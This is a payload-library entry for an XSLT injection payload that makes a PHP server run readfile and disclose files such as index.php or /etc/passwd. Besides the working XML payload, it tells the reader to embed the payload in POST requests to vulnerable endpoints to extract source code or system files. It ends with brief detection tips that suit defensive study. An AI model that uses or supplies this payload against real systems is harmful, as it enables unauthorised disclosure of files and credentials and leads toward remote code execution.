---
id: 13c8b4d5-1b28-4eee-bc93-d3983d22b1cb
name: xslt-php-readfile-payload
type: code
language: xml
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
  - PHP
tags:
  - xslt-injection
  - file-read
  - rce
validated: true
---

# XSLT PHP Readfile Payload

## Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```

## Description

This XSLT payload injects a PHP readfile function call to disclose the contents of a specified file during XML processing. It declares the PHP namespace to enable function invocation and uses xsl:value-of to output the file contents directly in the transformation result. Used for initial information disclosure in XSLT injection attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'index.php' | Path to the target file | 'index.php' or '/etc/passwd' |

## Usage

Embed this payload in an HTTP POST request to a vulnerable XML/XSLT endpoint (e.g., via curl as shown in [[commands/inject-xslt-php-readfile]]). Substitute the file path and send to trigger the read. Ideal for extracting source code or system files after confirming the injection point.

## Detection

- Monitor XML inputs for suspicious namespaces like 'http://php.net/xsl' or 'php:function' calls.
- Log libxml parsing events and alert on readfile or similar file access from web processes.
- WAF rules for XSLT payloads containing PHP function invocations; network logs showing unusual file paths in POST data.

## Related

- [[procedures/xslt-injection-for-php-remote-code-execution]]
- [[techniques/XSL Script Processing|T1220]]
